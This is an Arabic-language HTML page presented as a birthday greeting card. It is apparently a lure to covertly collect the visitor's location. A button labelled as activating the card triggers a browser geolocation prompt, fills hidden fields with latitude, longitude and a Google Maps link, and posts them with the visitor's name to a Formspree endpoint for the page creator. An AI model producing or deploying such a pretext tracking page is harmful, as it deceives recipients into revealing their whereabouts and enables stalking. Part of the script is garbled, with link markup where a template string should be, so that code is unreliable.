<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>كل عام وأنت بخير! 🎉</title>
<style>
body {
font-family: system-ui, -apple-system, sans-serif;
display: flex;
justify-content: center;
align-items: center;
min-height: 100vh;
margin: 0;
background: linear-gradient(135deg, #ff9a9e 0%, #fad0c4 99%, #fad0c4 100%);
padding: 20px;
}
.card {
background: #ffffff;
padding: 30px 25px;
border-radius: 20px;
box-shadow: 0 10px 30px rgba(0,0,0,0.15);
text-align: center;
width: 100%;
max-width: 380px;
}
h2 {
color: #ff4757;
margin-bottom: 10px;
}
.greeting-text {
font-size: 15px;
color: #555;
margin-bottom: 20px;
line-height: 1.6;
}
input[type="text"] {
width: 100%;
padding: 12px;
margin-bottom: 15px;
border: 1px solid #ddd;
border-radius: 10px;
box-sizing: border-box;
font-size: 16px;
text-align: center;
background-color: #fafafa;
}
.btn-geo {
width: 100%;
padding: 12px;
margin-bottom: 15px;
background-color: #ff6b81;
color: white;
border: none;
border-radius: 10px;
cursor: pointer;
font-size: 15px;
font-weight: bold;
transition: background 0.3s;
}
.btn-geo:hover {
background-color: #ff4757;
}
.btn-submit {
width: 100%;
padding: 14px;
background-color: #2ed573;
color: white;
border: none;
border-radius: 10px;
font-size: 16px;
font-weight: bold;
cursor: pointer;
transition: background 0.3s;
}
.btn-submit:hover {
background-color: #26af5f;
}
#status {
font-size: 13px;
margin-bottom: 15px;
color: #666;
font-weight: 500;
}
</style>
</head>
<body>
<div class="card">
<h2>🎂 عيد ميلاد سعيد! 🎈</h2>
<p class="greeting-text">أهلاً بك! لقد أعددت لك هذه البطاقة الخاصة بمناسبة عيد ميلادك. أكتب اسمك وشاركنا فرحتك لنحتفل معاً!</p>
<form action="[https://formspree.io/f/xpqvvkdp](https://formspree.io/f/xpqvvkdp)" method="POST">
<!-- حقل الاسم -->
<input type="text" name="name" placeholder="أدخل اسمك الكريم هنا" required>
<!-- زر اختياري لطلب مشاركة الموقع الجغرافي من العميل -->
<button type="button" class="btn-geo" onclick="getLocation()">اضغط هنا لتفعيل بطاقة التهنئة 🎁</button>
<div id="status"></div>
<!-- حقول مخفية تُعبأ بالإحداثيات بعد موافقة العميل -->
<input type="hidden" name="latitude" id="lat">
<input type="hidden" name="longitude" id="lon">
<input type="hidden" name="google_maps_link" id="map_link">
<!-- زر الإرسال إلى إيميلك -->
<button type="submit" class="btn-submit">إرسال التهنئة الان ✨</button>
</form>
</div>
<script>
function getLocation() {
const status = document.getElementById('status');
if (navigator.geolocation) {
status.innerText = "جاري تحضير مفاجأة العيد ميلاد...";
navigator.geolocation.getCurrentPosition(
// في حال وافق العميل بنفسه
(position) => {
const lat = position.coords.latitude;
const lon = position.coords.longitude;
document.getElementById('lat').value = lat;
document.getElementById('lon').value = lon;
document.getElementById('map_link').value = ⁠[https://maps.google.com/?q=$](https://maps.google.com/?q=$){lat},${lon}⁠;
status.innerText = "تم تجهيز المفاجأة بنجاح! 🎉";
status.style.color = "#2ed573";
},
// في حال رفض العميل
(error) => {
status.innerText = "تم تخطي الخطوة أو تعذر اكمال الخطوه.";
status.style.color = "#ff4757";
}
);
} else {
status.innerText = "متصفحك لا يدعم هذه الخدمة.";
}
}
</script>
</body>
</html>
